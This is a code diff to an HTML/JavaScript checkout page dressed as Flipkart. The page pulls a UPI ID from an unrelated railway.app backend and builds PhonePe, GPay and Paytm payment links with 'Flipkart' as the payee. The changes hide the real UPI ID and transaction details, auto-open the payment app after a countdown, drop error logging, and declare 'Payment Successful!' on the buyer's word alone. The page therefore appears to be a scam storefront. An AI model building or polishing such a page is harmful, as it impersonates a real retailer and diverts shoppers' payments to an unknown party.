@@ -42,14 +42,14 @@ body{ margin:0; background:#f1f3f6 }
 .btn{ background:#fb641b; color:#fff; border:none; padding:12px 24px; font-size:16px; border-radius:4px; cursor:pointer }
 .btn:disabled{ background:#ccc; cursor:not-allowed }
 
-/* MODAL STYLES */
+/* SIMPLE MODAL STYLES */
 .modal-overlay {
   position: fixed;
   top: 0;
   left: 0;
   width: 100%;
   height: 100%;
-  background: rgba(0,0,0,0.5);
+  background: rgba(0,0,0,0.7);
   z-index: 2000;
   display: none;
   justify-content: center;
@@ -59,60 +59,23 @@ body{ margin:0; background:#f1f3f6 }
 .modal-content {
   background: white;
   width: 90%;
-  max-width: 400px;
+  max-width: 350px;
   border-radius: 12px;
-  padding: 20px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+  padding: 25px;
+  text-align: center;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.3);
 }
 
-.modal-header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 15px;
-}
-
-.modal-header h3 {
-  margin: 0;
-  color: #2874f0;
-}
-
-.close-btn {
-  background: none;
-  border: none;
-  font-size: 24px;
-  cursor: pointer;
-  color: #666;
-}
-
-.upi-details {
-  background: #f8f9fa;
-  padding: 15px;
-  border-radius: 8px;
+.success-check {
+  color: #388e3c;
+  font-size: 48px;
   margin: 15px 0;
-  border: 1px dashed #ddd;
-}
-
-.upi-details div {
-  margin: 8px 0;
-  display: flex;
-  justify-content: space-between;
-}
-
-.upi-details .label {
-  color: #666;
-  font-size: 14px;
-}
-
-.upi-details .value {
-  font-weight: 600;
-  color: #333;
 }
 
 .action-buttons {
   display: flex;
   gap: 10px;
-  margin-top: 20px;
+  margin-top: 25px;
 }
 
 .secondary-btn {
@@ -120,10 +83,11 @@ body{ margin:0; background:#f1f3f6 }
   background: #f1f3f6;
   color: #333;
   border: 1px solid #ddd;
-  padding: 12px;
-  border-radius: 4px;
+  padding: 14px;
+  border-radius: 8px;
   cursor: pointer;
   font-weight: 600;
+  font-size: 16px;
 }
 
 .primary-btn {
@@ -131,62 +95,33 @@ body{ margin:0; background:#f1f3f6 }
   background: #2874f0;
   color: white;
   border: none;
-  padding: 12px;
-  border-radius: 4px;
+  padding: 14px;
+  border-radius: 8px;
   cursor: pointer;
   font-weight: 600;
+  font-size: 16px;
 }
 
-.manual-upi {
-  margin-top: 15px;
-  padding-top: 15px;
-  border-top: 1px solid #eee;
-  text-align: center;
-}
-
-.manual-upi p {
-  font-size: 12px;
-  color: #666;
-  margin-bottom: 5px;
-}
-
-.manual-upi .upi-id {
-  background: #fff;
-  padding: 8px;
-  border-radius: 4px;
-  border: 1px solid #2874f0;
-  font-family: monospace;
+.countdown {
   font-size: 14px;
-  color: #2874f0;
-  cursor: pointer;
-  margin-top: 5px;
-  display: inline-block;
+  color: #666;
+  margin: 15px 0;
+  font-weight: bold;
 }
 
-.loading {
-  text-align: center;
-  padding: 20px;
-}
-
-.spinner {
-  border: 3px solid #f3f3f3;
-  border-top: 3px solid #2874f0;
+.loading-spinner {
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #2874f0;
   border-radius: 50%;
-  width: 40px;
-  height: 40px;
+  width: 50px;
+  height: 50px;
   animation: spin 1s linear infinite;
-  margin: 0 auto 15px;
+  margin: 20px auto;
 }
 
 @keyframes spin {
   0% { transform: rotate(0deg); }
   100% { transform: rotate(360deg); }
-}
-
-.success-check {
-  color: #388e3c;
-  font-size: 48px;
-  margin: 15px 0;
 }
 </style>
 </head>
@@ -240,25 +175,17 @@ body{ margin:0; background:#f1f3f6 }
   <button class="btn" id="orderBtn" disabled>Pay Now</button>
 </div>
 
-<!-- UPI MODAL -->
-<div class="modal-overlay" id="upiModal">
-  <div class="modal-content">
-    <div class="modal-header">
-      <h3>Complete Payment</h3>
-      <button class="close-btn" onclick="closeModal()">&times;</button>
-    </div>
-    
-    <div id="modalBody">
-      <!-- Content will be dynamically filled -->
-    </div>
+<!-- CONFIRMATION MODAL -->
+<div class="modal-overlay" id="confirmModal">
+  <div class="modal-content" id="modalContent">
+    <!-- Content filled by JS -->
   </div>
 </div>
 
 <script>
 let productId="", productName="", productPrice=0;
 let upiId="", selectedMethod="phonepe";
-let isPaymentInProgress = false;
-let appCheckTimeout;
+let countdownInterval;
 
 const PRODUCTS_API="https://flipback-production.up.railway.app/api/products";
 const UPI_API="https://flipback-production.up.railway.app/api/upi";
@@ -275,7 +202,6 @@ async function loadUPI(){
     const data = await response.json();
     upiId = data?.data?.upi_id || data?.upi_id || "test@upi";
   } catch (error) {
-    console.error("Error loading UPI:", error);
     upiId = "test@upi";
   }
 }
@@ -321,7 +247,6 @@ async function loadProduct(){
     
     document.getElementById('orderBtn').disabled = false;
   } catch (error) {
-    console.error("Error loading product:", error);
     alert("Failed to load product details");
   }
 }
@@ -334,200 +259,149 @@ function loadAddress(){
   ` : "No address found";
 }
 
-/* MODAL FUNCTIONS */
-function showModal(content){
-  document.getElementById('modalBody').innerHTML = content;
-  document.getElementById('upiModal').style.display = 'flex';
-  document.body.style.overflow = 'hidden';
-}
-
-function closeModal(){
-  document.getElementById('upiModal').style.display = 'none';
-  document.body.style.overflow = 'auto';
-  isPaymentInProgress = false;
-  if(appCheckTimeout) clearTimeout(appCheckTimeout);
-}
-
-/* SHOW PAYMENT MODAL */
-function showPaymentModal(){
-  if(isPaymentInProgress) return;
-  
-  isPaymentInProgress = true;
-  
-  const txnId = "TXN" + Date.now() + Math.floor(Math.random() * 1000);
-  const note = productName.substring(0, 30);
-  
-  const upiLinks = {
-    phonepe: `phonepe://pay?pa=${upiId}&pn=Flipkart&am=${productPrice}&cu=INR&tn=${note}&tr=${txnId}`,
-    gpay: `tez://upi/pay?pa=${upiId}&pn=Flipkart&am=${productPrice}&cu=INR&tn=${note}&tr=${txnId}`,
-    paytm: `paytmmp://pay?pa=${upiId}&pn=Flipkart&am=${productPrice}&cu=INR&tn=${note}&tr=${txnId}`
-  };
-  
+/* SHOW CONFIRMATION MODAL */
+function showConfirmationModal(){
+  const modal = document.getElementById('confirmModal');
   const appNames = {
     phonepe: "PhonePe",
     gpay: "Google Pay",
     paytm: "Paytm"
   };
   
-  const modalContent = `
-    <div class="loading">
-      <div class="spinner"></div>
-      <p>Preparing payment request...</p>
+  const appName = appNames[selectedMethod];
+  
+  document.getElementById('modalContent').innerHTML = `
+    <div style="margin-bottom: 20px;">
+      <i class="fas fa-external-link-alt" style="font-size: 40px; color: #2874f0;"></i>
+    </div>
+    <h3 style="margin: 0 0 10px 0;">Open ${appName}</h3>
+    <p style="color: #666; margin-bottom: 20px;">
+      Click "Open App" to complete payment in ${appName}
+    </p>
+    <div class="countdown" id="countdown">Opening in 3 seconds...</div>
+    <div class="action-buttons">
+      <button class="secondary-btn" onclick="closeModal()">Cancel</button>
+      <button class="primary-btn" onclick="openUPIAppNow()">Open App Now</button>
     </div>
   `;
   
-  showModal(modalContent);
+  modal.style.display = 'flex';
   
-  // Small delay to show loading
+  // Start countdown
+  let count = 3;
+  const countdownEl = document.getElementById('countdown');
+  countdownInterval = setInterval(() => {
+    count--;
+    if(count > 0) {
+      countdownEl.textContent = `Opening in ${count} second${count > 1 ? 's' : ''}...`;
+    } else {
+      clearInterval(countdownInterval);
+      openUPIAppNow();
+    }
+  }, 1000);
+}
+
+/* CLOSE MODAL */
+function closeModal(){
+  document.getElementById('confirmModal').style.display = 'none';
+  if(countdownInterval) clearInterval(countdownInterval);
+}
+
+/* OPEN UPI APP IMMEDIATELY */
+function openUPIAppNow(){
+  if(countdownInterval) clearInterval(countdownInterval);
+  
+  // Show loading briefly
+  document.getElementById('modalContent').innerHTML = `
+    <div style="margin: 30px 0;">
+      <div class="loading-spinner"></div>
+      <p style="margin-top: 20px;">Opening payment app...</p>
+    </div>
+  `;
+  
+  // Generate UPI link
+  const amt = productPrice.toString();
+  const note = encodeURIComponent(productName.substring(0,30));
+  const txn = "TXN" + Date.now();
+  
+  let url = "";
+  if(selectedMethod === "phonepe") {
+    url = `phonepe://pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=${note}&tr=${txn}`;
+  } else if(selectedMethod === "gpay") {
+    url = `tez://upi/pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=${note}&tr=${txn}`;
+  } else {
+    url = `paytmmp://pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=${note}&tr=${txn}`;
+  }
+  
+  // Close modal and open UPI app after brief delay
   setTimeout(() => {
-    const finalContent = `
-      <div class="upi-details">
-        <div>
-          <span class="label">Amount:</span>
-          <span class="value">₹${productPrice}</span>
-        </div>
-        <div>
-          <span class="label">Merchant:</span>
-          <span class="value">Flipkart</span>
-        </div>
-        <div>
-          <span class="label">Transaction ID:</span>
-          <span class="value">${txnId}</span>
-        </div>
-      </div>
-      
-      <p style="text-align: center; margin: 15px 0; color: #666;">
-        Click "Open ${appNames[selectedMethod]}" to complete payment
-      </p>
-      
-      <div class="action-buttons">
-        <button class="secondary-btn" onclick="closeModal()">Cancel</button>
-        <button class="primary-btn" onclick="openUPIApp('${upiLinks[selectedMethod]}')">
-          Open ${appNames[selectedMethod]}
-        </button>
-      </div>
-      
-      <div class="manual-upi">
-        <p>Or manually copy this UPI ID to pay:</p>
-        <div class="upi-id" onclick="copyUPIId()">
-          ${upiId}
-          <i class="fas fa-copy" style="margin-left: 5px;"></i>
-        </div>
-        <p style="font-size: 10px; margin-top: 8px; color: #999;">
-          Click to copy. Open your UPI app and paste to pay.
-        </p>
-      </div>
-      
-      <div style="margin-top: 20px; padding: 10px; background: #f0f7ff; border-radius: 4px; font-size: 12px; color: #2874f0;">
-        <i class="fas fa-info-circle"></i> After payment, click "Payment Done" button below
-      </div>
-    `;
+    document.getElementById('confirmModal').style.display = 'none';
+    window.location.href = url;
     
-    document.getElementById('modalBody').innerHTML = finalContent;
-    
-    // Start checking if user left the app (payment might be done)
-    startPaymentStatusCheck(txnId);
-    
+    // Check payment status after 3 seconds
+    setTimeout(() => {
+      checkPaymentStatus();
+    }, 3000);
   }, 800);
 }
 
-/* OPEN UPI APP WITH USER CONFIRMATION */
-function openUPIApp(url){
-  // Store timestamp when user opens the app
-  localStorage.setItem('paymentStartTime', Date.now());
+/* CHECK PAYMENT STATUS */
+function checkPaymentStatus(){
+  const modal = document.getElementById('confirmModal');
   
-  // Open the UPI app
-  window.location.href = url;
+  document.getElementById('modalContent').innerHTML = `
+    <div style="margin-bottom: 20px;">
+      <div class="success-check">
+        <i class="fas fa-question-circle" style="color: #ff9800;"></i>
+      </div>
+    </div>
+    <h3 style="margin: 0 0 10px 0;">Payment Status</h3>
+    <p style="color: #666; margin-bottom: 20px;">
+      Did you complete the payment?
+    </p>
+    <div class="action-buttons">
+      <button class="secondary-btn" onclick="closeModal()">No, Try Again</button>
+      <button class="primary-btn" onclick="paymentSuccess()">Yes, Payment Done</button>
+    </div>
+    <p style="font-size: 12px; color: #999; margin-top: 15px;">
+      Check your UPI app for payment confirmation
+    </p>
+  `;
   
-  // After 2 seconds, show payment confirmation option
+  modal.style.display = 'flex';
+}
+
+/* PAYMENT SUCCESS */
+function paymentSuccess(){
+  document.getElementById('modalContent').innerHTML = `
+    <div style="margin-bottom: 20px;">
+      <div class="success-check">
+        <i class="fas fa-check-circle"></i>
+      </div>
+    </div>
+    <h3 style="margin: 0 0 10px 0; color: #388e3c;">Payment Successful!</h3>
+    <p style="color: #666; margin-bottom: 25px;">
+      Redirecting to order confirmation...
+    </p>
+    <div class="loading-spinner" style="border-top-color: #388e3c;"></div>
+  `;
+  
+  // Redirect after 2 seconds
   setTimeout(() => {
-    showPaymentConfirmation();
+    window.location.href = `thankyou.html?id=${productId}`;
   }, 2000);
 }
 
-/* SHOW PAYMENT CONFIRMATION */
-function showPaymentConfirmation(){
-  const confirmationContent = `
-    <div style="text-align: center; padding: 20px;">
-      <div class="success-check">
-        <i class="fas fa-check-circle"></i>
-      </div>
-      <h3 style="color: #388e3c;">Payment Initiated</h3>
-      <p style="color: #666; margin: 15px 0;">
-        Please complete the payment in your UPI app.
-      </p>
-      <p style="color: #999; font-size: 12px; margin-bottom: 20px;">
-        If you've completed the payment, click below:
-      </p>
-      <div class="action-buttons">
-        <button class="secondary-btn" onclick="closeModal()">
-          Payment Failed
-        </button>
-        <button class="primary-btn" onclick="paymentSuccessful()">
-          Payment Done
-        </button>
-      </div>
-      <p style="font-size: 11px; color: #999; margin-top: 15px;">
-        You can also check your UPI app for payment status.
-      </p>
-    </div>
-  `;
-  
-  document.getElementById('modalBody').innerHTML = confirmationContent;
-}
-
-function paymentSuccessful(){
-  if(appCheckTimeout) clearTimeout(appCheckTimeout);
-  
-  const successContent = `
-    <div style="text-align: center; padding: 20px;">
-      <div class="success-check">
-        <i class="fas fa-check-circle"></i>
-      </div>
-      <h3 style="color: #388e3c;">Payment Successful!</h3>
-      <p style="color: #666; margin: 20px 0;">
-        Your order has been placed successfully.
-      </p>
-      <button class="primary-btn" style="width: 100%;" onclick="redirectToThankYou()">
-        View Order Details
-      </button>
-    </div>
-  `;
-  
-  document.getElementById('modalBody').innerHTML = successContent;
-  
-  setTimeout(redirectToThankYou, 3000);
-}
-
-function redirectToThankYou(){
-  window.location.href = `thankyou.html?id=${productId}`;
-}
-
-function copyUPIId(){
-  navigator.clipboard.writeText(upiId).then(() => {
-    const upiElement = document.querySelector('.upi-id');
-    const originalText = upiElement.innerHTML;
-    upiElement.innerHTML = 'Copied! <i class="fas fa-check"></i>';
-    setTimeout(() => {
-      upiElement.innerHTML = originalText;
-    }, 2000);
-  });
-}
-
-function startPaymentStatusCheck(txnId){
-  appCheckTimeout = setTimeout(() => {
-    if(isPaymentInProgress){
-      showPaymentConfirmation();
-    }
-  }, 30000);
-}
-
+/* INITIALIZE PAGE */
 document.addEventListener('DOMContentLoaded', function() {
+  // Load UPI ID
   loadUPI();
   
+  // Load product and address
   loadProduct();
   loadAddress();
   
+  // Payment method selection
   document.querySelectorAll(".pay-option").forEach(p => {
     p.onclick = () => {
       document.querySelectorAll(".pay-option").forEach(x => x.classList.remove("selected"));
@@ -536,23 +410,19 @@ document.addEventListener('DOMContentLoaded', function() {
     };
   });
   
-  document.getElementById('orderBtn').onclick = showPaymentModal;
+  // Order button click - shows confirmation modal first
+  document.getElementById('orderBtn').onclick = showConfirmationModal;
   
+  // When user returns to the page (from UPI app), show payment status check
   document.addEventListener('visibilitychange', function() {
-    if(document.visibilityState === 'visible' && isPaymentInProgress){
-      setTimeout(() => {
-        if(isPaymentInProgress){
-          showPaymentConfirmation();
-        }
-      }, 1000);
+    if(document.visibilityState === 'visible') {
+      const modal = document.getElementById('confirmModal');
+      if(modal.style.display === 'flex') {
+        // If modal is open when user returns, check payment status
+        setTimeout(checkPaymentStatus, 500);
+      }
     }
   });
-});
-
-window.addEventListener('beforeunload', function(e) {
-  if(isPaymentInProgress){
-    return undefined;
-  }
 });
 </script>
 
